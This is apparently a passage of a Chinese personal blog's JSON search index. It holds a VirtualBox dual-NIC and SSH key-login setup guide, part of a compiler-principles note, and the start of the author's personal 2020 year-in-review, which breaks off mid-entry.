\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u8868\u793a\u3002 \u4f5c\u7528\uff1a\u5206\u79bb\u524d\u7aef\u548c\u540e\u7aef\uff0c\u53ef\u4ee5\u66f4\u5bb9\u6613\u521b\u9020\u4e00\u79cd\u65b0\u8bed\u8a00\u6216\u79fb\u690d\u4e00\u79cd\u8bed\u8a00\u5230\u65b0\u7684\u67b6\u6784\u4e0a\u3002 \u7814\u7a76\u5bf9\u4e2d\u95f4\u4ee3\u7801\u7684\u4f18\u5316\u7684\u6280\u672f\u800c\u65e0\u9700\u8003\u8651\u5177\u4f53\u67b6\u6784\uff08\u5f53\u7136\u9488\u5bf9\u67b6\u6784\u7684\u4f18\u5316\u4e5f\u662f\u5f88\u91cd\u8981\u7684\uff09</p> </li> <li> <p>\u76ee\u6807\u4ee3\u7801\u751f\u6210\uff1a\u8f93\u51fa\u6c47\u7f16\u8bed\u8a00\u6216\u673a\u5668\u4ee3\u7801</p> </li> </ol>","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E6%8A%98%E8%85%BE/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/","title":"Virtual Box\u914d\u7f6e\u53cc\u7f51\u5361","text":"<p>\u7531\u4e8e\u76ee\u524d\u5728\u7535\u8111\u4e0a\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u5df2\u7ecf\u6bd4\u8f83\u6d41\u7545\uff0c\u800c\u865a\u62df\u673a\u53c8\u6709\u7740\u771f\u673a\u65e0\u6cd5\u6bd4\u62df\u7684\u4f18\u52bf\uff0c\u5982\uff1a - \u53ef\u4ee5\u5feb\u901f\u5730\u8fdb\u884c\u5907\u4efd\u4e0e\u8fd8\u539f\uff0c\u4e14\u5907\u4efd\u7684\u865a\u62df\u673a\u955c\u50cf\u53ef\u4ee5\u590d\u5236\u5230\u5176\u5b83\u7535\u8111\u4e0a - \u53ef\u4ee5\u4fdd\u5b58\u865a\u62df\u673a\u5f53\u524d\u7684\u8fd0\u884c\u72b6\u6001\uff08\u5feb\u901f\u4f11\u7720\uff09\uff0c\u800c\u4e0b\u6b21\u542f\u52a8\u65f6\u6062\u590d\u8fd0\u884c\uff08\u4e14\u901f\u5ea6\u5f88\u5feb\uff09</p> <p>\u56e0\u6b64\u6211\u914d\u7f6e\u4e86\u4e00\u53f0Ubuntu18.0\u7684\u865a\u62df\u673a\uff0c\u5e76\u505a\u4e86\u4ee5\u4e0b\u914d\u7f6e\uff1a</p> <ul> <li>\u914d\u7f6e\u4e86build-essential, python3, git, vim\u7b49\u5e38\u7528\u8f6f\u4ef6</li> <li>\u914d\u7f6e\u4e86zsh\uff0c\u4ee5\u53ca\u4e00\u4e9bzsh\u7684\u63d2\u4ef6\u5982\u81ea\u52a8\u63d0\u793a\uff0c\u547d\u4ee4\u9ad8\u4eae\uff0cauto-jump</li> <li>\u914d\u7f6e\u4e86VS Code, Chromium\u8f6f\u4ef6</li> <li>\u914d\u7f6e\u4e86nodejs, cnpm, hexo\u7b49\uff0c\u7528\u4e8e\u7f16\u5199hexo\u535a\u5ba2</li> <li>\u542f\u52a8sshd\uff0c\u5e76\u914d\u7f6e\u7f51\u7edc</li> </ul> <p>\u5176\u4e2d\uff0c\u5173\u4e8e\u6700\u540e\u4e00\u70b9\u3002\u521a\u5f00\u59cb\u6211\u91c7\u7528\u4e86\u6865\u63a5\u7f51\u7edc+\u9759\u6001ip\u7684\u65b9\u6848\u3002\u4f46\u662f\u53d1\u73b0\u5f53\u4e3b\u673a\u7f51\u7edc\u73af\u5883\u6539\u53d8\u65f6\uff0cssh\u4fbf\u8fde\u63a5\u4e0d\u4e0a\u4e86\uff0c\u4e8e\u662f\u4fbf\u6709\u4e86\u8fd9\u7bc7\u535a\u5ba2\u3002</p>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u57fa\u672c\u77e5\u8bc6","title":"\u57fa\u672c\u77e5\u8bc6","text":"<p>\u865a\u62df\u673a\u914d\u7f6e\u7f51\u7edc\u6709\u4e09\u79cd\u65b9\u5f0f\uff1a 1. NAT 2. \u6865\u63a5\u6a21\u5f0f 3. Host-Only</p> <p>\u91c7\u7528NAT\u65b9\u5f0f\u65f6\uff0c\u865a\u62df\u673a\u548c\u4e3b\u673a\u4f4d\u4e8e\u4e0d\u540c\u7684\u7f51\u6bb5\uff0c\u4e3b\u673a\u4f1a\u8fd0\u884cNAT\u7a0b\u5e8f\uff0c\u865a\u62df\u673a\u901a\u8fc7\u4e3b\u673a\u8bbf\u95ee\u5916\u7f51\u3002\u56e0\u6b64\u548c\u4e3b\u673a\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\u7edc\u7684\u5176\u5b83\u4e3b\u673a\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u865a\u62df\u673a\uff08\u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\uff09\uff0c\u82e5\u8981\u8bbf\u95ee\uff0c\u5219\u9700\u8981\u5728\u4e3b\u673a\u4e0a\u8bbe\u7f6e\u7aef\u53e3\u8f6c\u53d1\u3002</p> <p>\u91c7\u7528\u6865\u63a5\u6a21\u5f0f\u65f6\uff0c\u865a\u62df\u673a\u548c\u4e3b\u673a\u4f4d\u4e8e\u76f8\u540c\u7684\u7f51\u6bb5\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5916\u7f51\u3002\u4e14\u548c\u4e3b\u673a\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u7684\u5176\u5b83\u4e3b\u673a\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u865a\u62df\u673a\u3002\u4f46\u5982\u679c\u4e3b\u673a\u5207\u6362\u4e86\u7f51\u7edc\uff0c\u5219\u865a\u62df\u673a\u7684ip\u4e5f\u4f1a\u53d1\u751f\u53d8\u5316\u3002</p> <p>Host-Only\u548cNAT\u6a21\u5f0f\u7c7b\u4f3c\uff0c\u53ea\u662f\u4e3b\u673a\u4e0d\u8bbe\u7f6e\u7aef\u53e3\u8f6c\u53d1\uff0c\u56e0\u6b64\u66f4\u52a0\u5b89\u5168\u3002</p>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u89e3\u51b3\u65b9\u6cd5","title":"\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u4e3a\u4e86\u540c\u65f6\u62e5\u6709NAT\u6a21\u5f0f\u548c\u6865\u63a5\u6a21\u5f0f\u7684\u4f18\u70b9\uff0c\u53ef\u4ee5\u4e3a\u865a\u62df\u673a\u8bbe\u7f6e\u4e24\u5f20\u7f51\u5361\u3002</p> <p>\u5728VB\u4e2d\u8bbe\u7f6e\u865a\u62df\u673a\u7684\u7f51\u7edc\uff08\u9700\u8981\u865a\u62df\u673a\u5173\u673a\uff09</p> <p></p> <p></p> <p>ifconfig\u67e5\u770b\u7f51\u5361\u8bbe\u7f6e</p> <p></p> <p>\u5176\u4e2denp0s3\u4e3a\u6865\u63a5\u7f51\u5361\uff0cenp0s8\u4e3aNAT\u7f51\u5361</p> <p>\u914d\u7f6e\u7f51\u53612\u7684\u7aef\u53e3\u8f6c\u53d1</p> <p></p> <p>\u5176\u4e2d\u865a\u62df\u673aip\u4e3a10.0.3.15\uff0csshd\u5f00\u542f\u7684\u7aef\u53e3\u4e3a22</p> <p>\u4e8e\u662f\u4fbf\u53ef\u4ee5\u901a\u8fc7\u4e3b\u673a\u76842333\u7aef\u53e3ssh\u8fde\u63a5\u5230\u865a\u62df\u673a\u4e86</p> <pre><code>ssh user@127.0.0.1 -p 2333\n</code></pre>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#ssh\u767b\u5f55","title":"ssh\u767b\u5f55","text":"<p>\u4e3a\u4e86\u5728\u767b\u5f55\u65f6\u4e0d\u7528\u8f93\u5165\u5bc6\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528ssh-key\u767b\u5f55</p> <ol> <li> <p>\u5728\u4e3b\u673a\u4e0a\u751f\u6210ssh key</p> <pre><code>ssh-keygen\n</code></pre> <p>\u4f1a\u5728~/.ssh\u4e0b\u751f\u6210\u516c\u94a5\u548c\u79c1\u94a5<code>id_rsa.pub, id_rsa</code></p> </li> <li> <p>\u5c06\u516c\u94a5\u590d\u5236\u5230\u865a\u62df\u673a\u7684<code>~/.ssh/authorized_keys</code>\u4e2d\uff0c\u6216\u4f7f\u7528<code>ssh-copy-id</code>\u547d\u4ee4</p> <pre><code>\u279c  ~ ssh-copy-id -h              \nUsage: /usr/bin/ssh-copy-id [-h|-?|-f|-n] [-i [identity_file]] [-p port] [[-o &lt;ssh -o options&gt;] ...] [user@]hostname\n    -f: force mode -- copy keys without trying to check if they are already installed\n    -n: dry run    -- no keys are actually copied\n    -h|-?: print this help\n</code></pre> <p>\u6b64\u65f6\u518dssh\u5df2\u7ecf\u4e0d\u7528\u8f93\u5165\u5bc6\u7801\u4e86</p> </li> <li> <p>VS Code\u7684Remote-SSH\u6269\u5c55     \u4f7f\u7528VS Code\u7684Remote-SSH\u8fde\u63a5\u5230\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u907f\u514d\u76f4\u63a5\u5728\u865a\u62df\u673a\u4e0a\u8fd0\u884cVS Code\u5361\u6162\u7684\u95ee\u9898\u3002     \u4e14VS Code\u63d0\u4f9b\u7684\u56fe\u5f62\u5316\u76ee\u5f55\u4e5f\u66f4\u52a0\u76f4\u89c2\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u4e3b\u673a\u4e0a\u7684\u6587\u4ef6\u76f4\u63a5\u62d6\u62fd\u8fdb\u865a\u62df\u673a</p> <p>\u914d\u7f6e\u4e3b\u673a\u4e0a\u7684~/.ssh/config\uff08\u901a\u8fc7\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9\uff09</p> <pre><code>Host VM-Ubuntu18.0\n  HostName 127.0.0.1\n  Port 2333\n  User rain\n  IdentityFile ~/.ssh/id_rsa\n</code></pre> <p>\u8fd9\u6837\u4e00\u6765\uff0cVS Code Remote Explorer\u4fbf\u4f1a\u663e\u793a\u8fdc\u7a0b\u7684\u865a\u62df\u673a\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>ssh rain@VM-Ubuntu18.0</code>\u547d\u4ee4\u884c\u8fdb\u884cssh\u8fde\u63a5\uff09</p> </li> </ol>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u5173\u4e8e\u914d\u7f6e\u9759\u6001ip","title":"\u5173\u4e8e\u914d\u7f6e\u9759\u6001ip","text":"<p>ubuntu\u91c7\u7528netplan\u914d\u7f6e\u7f51\u7edc</p> <pre><code>\u279c  ~ cat /etc/netplan/01-network-manager-all.yaml                     \n# Let NetworkManager manage all devices on this system\nnetwork:\n  version: 2\n  renderer: NetworkManager\n  ethernets:\n    enp0s3:\n      dhcp4: false\n      addresses:\n      - 192.168.1.233/24\n      gateway4: 192.168.1.1\n      nameservers:\n              addresses: [223.5.5.5, 223.6.6.6]\n</code></pre>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/","title":"\u5173\u4e8e2020\u5230\u76ee\u524d\u7684\u4e00\u4e2a\u603b\u7ed3","text":"<p>2020\u5e74\u5bf9\u5168\u4eba\u7c7b\u6765\u8bf4\u662f\u4e0d\u5e73\u51e1\u7684\u4e00\u5e74\uff0c\u800c\u5bf9\u6211\u6765\u8bf4\u4e5f\u662f\u4e0d\u540c\u5bfb\u5e38\u7684\u4e00\u5e74\u3002\u8fd9\u4e00\u5e74\u53d1\u751f\u4e86\u8bb8\u591a\u5927\u5927\u5c0f\u5c0f\u7684\u4e8b\uff0c\u6709\u4e9b\u4e8b\u60c5\u8eab\u5904\u5176\u4e2d\u65f6\u89c9\u5f97\u975e\u5e38\u4e0d\u5f97\u4e86\uff0c\u800c\u7ecf\u5386\u8fc7\u540e\uff0c\u53c8\u89c9\u5f97\u4e5f\u8bb8\u5f88\u5feb\u5c31\u4f1a\u5fd8\u8bb0\uff0c\u56e0\u6b64\u60f3\u8bb0\u5f55\u4e00\u4e9b\u8fd9\u4e00\u5e74\u6211\u90fd\u5e72\u4e86\u4e9b\u4ec0\u4e48\u4e8b\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5bd2\u5047","title":"\u5bd2\u5047","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#wwh\u7684\u91cd\u5e86\u4e4b\u65c5","title":"wwh\u7684\u91cd\u5e86\u4e4b\u65c5","text":"<p>\u5b66\u6821\u653e\u5047\u4e86\uff0cwwh\u7b2c\u4e00\u6b21\u6765\u91cd\u5e86\u627e\u6211\u73a9\u3002\u6211\u4eec\u4e00\u5171\u73a9\u4e863\u5929\uff0c\u53bb\u7535\u5f71\u9662\u770b\u4e86\u7d2b\u7f57\u5170\u7684\u6c38\u6052\u82b1\u56ed\uff0c\u53bb\u4e86\u5ddd\u5916\u627e\u4e86chq\uff0c\u53bb\u4e86\u78c1\u5668\u53e3\uff0c\u767d\u516c\u9986\u3002\u6700\u540e\u4e00\u8d77\u5750\u706b\u8f66\u5367\u94fa\u56de\u5bb6\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5bb6\u91cc\u5c0f\u72d7\u7684\u6210\u957f","title":"\u5bb6\u91cc\u5c0f\u72d7\u7684\u6210\u957f","text":"<p>\u5bb6\u91cc\u7684\u5927\u72d7\u548c\u80d6\u5b50\u90fd\u4e0b\u4e86\u5c0f\u72d7\uff0c\u5bd2\u5047\u5728\u5bb6\u671f\u95f4\u89c1\u8bc1\u4e86\u4ed6\u4eec\u4ece\u5c0f\u4e0d\u70b9\uff0c\u5230\u53ef\u4ee5\u5728\u6ee1\u9662\u5b50\u8dd1\u7684\u5168\u8fc7\u7a0b\u3002</p> <p>\u5927\u72d7\u4e0b\u7684\u5c0f\u72d7\u67093\u53ea\uff0c\u8981\u6bd4\u80d6\u5b50\u72d7\u4e0b\u76846\u53ea\u80d6\u8bb8\u591a\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#asc\u8d85\u7b97\u6bd4\u8d5b","title":"ASC\u8d85\u7b97\u6bd4\u8d5b","text":"<p>\u7531\u4e8e\u53c2\u52a0\u4e86ASC\u7684\u8d85\u7b97\u6bd4\u8d5b\uff0c\u6240\u4ee5\u5e73\u65f6\u4e5f\u4f1a\u6298\u817e\u4e00\u4e0blinux\uff0c\u4f46\u8fdb\u5c55\u7f13\u6162\uff0c\u505a\u4e86\u7b2c\u4e00\u4e2a\u4f18\u5316HPL\u540e\u5c31\u6ca1\u6709\u5f04\u4e86\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#switch","title":"Switch\uff01\uff01\uff01","text":"<p>\u59d0\u59d0\u56de\u5bb6\u4e86\uff0c\u53ef\u4ee5\u73a9<sub>~switch</sub>~\u585e\u5c14\u8fbe\u4e86</p> <p>\u521a\u5f00\u59cb\u5728switch\u7684\u638c\u673a\u5c4f\u5e55\u4e0a\u73a9\u59cb\u7ec8\u4e0d\u8fc7\u763e\uff0c\u4e8e\u662f\u6211\u63d0\u8bae\u5bb6\u91cc\u6362\u7535\u89c6\uff0c\u6700\u540e\u4e70\u4e86\u5c0f\u7c73\u768455\u82f1\u5bf8\u7684\u7535\u89c6\u3002\u7545\u6e38hyrule\u5927\u9646\u7684\u611f\u89c9\u5b9e\u5728\u592a\u723d\u4e86\uff01</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6298\u817e\u6a21\u62df\u5668","title":"\u6298\u817e\u6a21\u62df\u5668","text":"<p>\u5728\u5bb6\u6298\u817e\u6a21\u62df\u5668\uff0c\u4e0b\u4e86\u51e0\u767eG\u7684wii, wiiu, 3ds\u7684\u6e38\u620f\u3002</p> <p>\u6210\u529f\u628a3ds\u4e0a\u7684\u300a\u706b\u7130\u7eb9\u7ae0-\u89c9\u9192\u300b\u63a8\u8350\u7ed9\u4e86yxl\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6811\u8393","title":"\u6811\u8393","text":"<p>yfh\u5bb6\u95e8\u53e3\u4ee5\u53ca\u9644\u8fd1\u7684\u9a6c\u8def\u65c1\u751f\u957f\u4e86\u4e00\u4e9b\u6811\u8393\uff0c\u6211\u4eec\u7ecf\u5e38\u53bb\u6458\u6765\u5403\u3002\u540e\u6765\u5728\u4e0a\u7f51\u8bfe\u524d\u751a\u81f3\u76f4\u63a5\u628a\u4e00\u9897\u6811\u8393\u79fb\u683d\u5230\u4e86\u6211\u5bb6\u9662\u5b50\u91cc\uff0c\u53ef\u4ee5\u4e0d\u5230\u51e0\u5929\u53f6\u5b50\u5c31\u67af\u9ec4\u4e86\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8fc7\u5e74\u75ab\u60c5","title":"\u8fc7\u5e74&amp;\u75ab\u60c5","text":"<p>\u75ab\u60c5\u7206\u53d1\uff0c\u8fc7\u5e74\uff0c\u53e3\u7f69\uff0c\u5047\u671f\u4e00\u5929\u5929\u8fb9\u957f\u3002\u3002\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u4e00\u6b21\u4e0d\u6109\u5feb\u7684\u7ecf\u5386","title":"\u4e00\u6b21\u4e0d\u6109\u5feb\u7684\u7ecf\u5386","text":"<p>\u7238\u5988\u5435\u67b6\uff08\u56e0\u4e3a\u8205\u8205\u501f\u4e86\u5de5\u5177\u6ca1\u6709\u8fd8\uff0c\u5988\u5988\u5e2e\u8205\u8205\u8bf4\u8bdd\uff09\uff0c\u6211\u88ab\u6c14\u54ed\uff0c\u6211\u529d\u7238\u7238\u548c\u5988\u5988\u6539\u5584\u5173\u7cfb\uff0c\u8bf4\u4e86\u5f88\u591a\u5927\u9053\u7406\uff0c\u8bb8\u591a\u4e8b\u60c5\u5939\u6742\u5728\u4e00\u8d77\uff0c\u7238\u7238\u4e5f\u8bb8\u4e5f\u662f\u538b\u529b\u5f88\u5927\uff0c\u7b2c\u4e00\u6b21\u770b\u89c1\u7238\u7238\u6d41\u6cea\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u4e0a\u7f51\u8bfe\u4e86","title":"\u4e0a\u7f51\u8bfe\u4e86","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u7f51\u8bfe","title":"\u7f51\u8bfe","text":"<p>\u5f00\u59cb\u4e0a\u7f51\u8bfe\uff0c\u8f6f\u4ef6\u5de5\u7a0b\uff0c\u6570\u636e\u5e93\uff0c\u7f16\u8bd1\u539f\u7406\uff0c\u611f\u89c9\u4e0d\u662f\u5f88\u5b66\u5f97\u8fdb\u53bb\uff0c\u5c24\u5176\u662f\u8f6f\u4ef6\u5de5\u7a0b\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u846c\u793c","title":"\u846c\u793c","text":"<p>\u53c2\u52a0\u65e7\u5916\u516c\u7684\u846c\u793c\uff0c\u53bb\u4e86\u5370\u8c61\u4e2d\u5c0f\u65f6\u5019\u53bb\u8fc7\u7684\u516c\u5893\uff0c\u706b\u846c\u573a\uff0c\u5728\u6c7d\u8f66\u4e0a\u88ab\u8868\u54e5\u95ee\u8d77\u4fdd\u7814\u7684\u610f\u5411\uff0c\u5728\u90a3\u51e0\u5929\u60f3\u4e86\u5f88\u591a\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5173\u4e8e\u5b9e\u4e60\u7684\u5fc3\u6001\u95ee\u9898","title":"\u5173\u4e8e\u5b9e\u4e60\u7684\u5fc3\u6001\u95ee\u9898","text":"<p>\u540c\u5b66\u4eec\u90fd\u5728\u73ed\u7fa4\u91cc\u53d1\u5b9e\u4e60\u9762\u8bd5\u7684\u4e8b\uff0c\u6211\u5374\u6ca1\u6709\u52c7\u6c14\u53bb\u62a5\u5b9e\u4e60\uff0c\u8bfe\u7a0b\u4e5f\u4e00\u62d6\u518d\u62d6\u3002\u6574\u4e2a\u5bd2\u5047\uff0c\u6211\u90fd\u5341\u5206\u5bb3\u6015\u522b\u4eba\u95ee\u6211\u5b9e\u4e60\u7684\u4e8b\u60c5\u3002\u88abltk\u95ee\u4e86\u4e4b\u540e\uff0c\u6211\u548c\u4ed6\u8bf4\u6211\u5fc3\u6001\u4e0a\u9047\u5230\u4e86\u4e00\u70b9\u95ee\u9898\u3002\u4ed6\u5b89\u6170\u4e86\u6211\uff0c\u8ddf\u6211\u8bb2\u4e86\u8bb8\u591a\uff0c\u5e76\u63a8\u8350\u4e86\u4e00\u4e9b\u5b9e\u4e60\uff0c\u6211\u5341\u5206\u611f\u8c22\u4ed6\u3002\u4f46\u662f\u540e\u6765\u6211\u8fd8\u662f\u6ca1\u6709\u89e3\u51b3\u5fc3\u6001\u4e0a\u7684\u95ee\u9898\uff0c\u4ecd\u7136\u6ca1\u6709\u53bb\u627e\u5b9e\u4e60\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5f00\u5b66","title":"\u5f00\u5b66","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8fd4\u7a0b","title":"\u8fd4\u7a0b","text":"<p>\u7531\u4e8ewgm\u4ed6\u4eec\u5728\u7fa4\u91cc\u8ba8\u8bba\u4e86\u673a\u7968\u7684\u4e8b\uff0c\u4e8e\u662f\u6211\u4fbf\u201c\u5077\u5077\u201d\u7684\u548c\u4ed6\u4eec\u4e70\u4e86\u540c\u4e00\u73ed\u98de\u673a\u3002</p> <p>\u5728\u8def\u4e0a\uff0c\u6211\u95ee\u4e86wgm\u8ba1\u7ec4\u7684\u4e8b\uff0c\u4e5f\u4e86\u89e3\u5230\u4e86hf\u4fdd\u7814\u7684\u4e8b\u60c5\u3002\u673a\u573a\u91cc\u4e00\u8d77\u6253\u51fa\u79df\u8f66\u56de\u5b66\u6821\uff0c0\u70b9\u5230\u8fbe\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c","title":"\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c","text":"<p>\u75af\u72c2\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c\uff0c\u8865\u4e86\u4e00\u4e2a\u661f\u671f\u3002\u6700\u540e\u7684\u6210\u54c1\u5728\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u90e8\u5206\u7f3a\u5c11\u5e03\u5c14\u8868\u8fbe\u5f0f\u7684\u7ffb\u8bd1\uff0c\u76ee\u6807\u4ee3\u7801\u751f\u6210\u5219\u5728\u5e26\u6709\u975e\u5e38\u591a\u524d\u63d0\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u51fd\u6570\u8c03\u7528\uff0c\u6700\u7ec8\u6210\u529f\u7f16\u8bd1\u4e86\u4e00\u4e2a\u5c0f\u7a0b\u5e8f\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5b66\u6821\u5b9e\u4e60","title":"\u5b66\u6821\u5b9e\u4e60","text":"<p>\u5b66\u6821\u5b9e\u4e60\uff0c\u548clh, xyh, lb, lg\u4e00\u7ec4\uff0c\u505a\u4e00\u4e2a\u4eff\u77e5\u4e4e\u7f51\u7ad9\u2014\u2014Behoo\uff0c\u8d1f\u8d23\u524d\u7aef\u3002\u5728\u6b64\u671f\u95f4\uff0c\u517b\u6210\u4e86\u53bb5\u98df\u5802\u5403\u996d\u7684\u4e60\u60ef\uff08\u6d88\u8d39\u6c34\u5e73\u9661\u5ced\u4e0a\u5347\uff09\u3002\u671f\u95f4\u6211\u7ed9\u4ed6\u4eec\u8bb2\u4e86\u5f88\u591agit\u7684\u4f7f\u7528\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6691\u5047","title":"\u6691\u5047","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u7ebf\u4e0a\u590f\u4ee4\u8425","title":"\u7ebf\u4e0a\u590f\u4ee4\u8425","text":"<p>\u590f\u4ee4\u8425\uff0c\u9762\u8bd5\uff0c\u62a5\u4e86\u4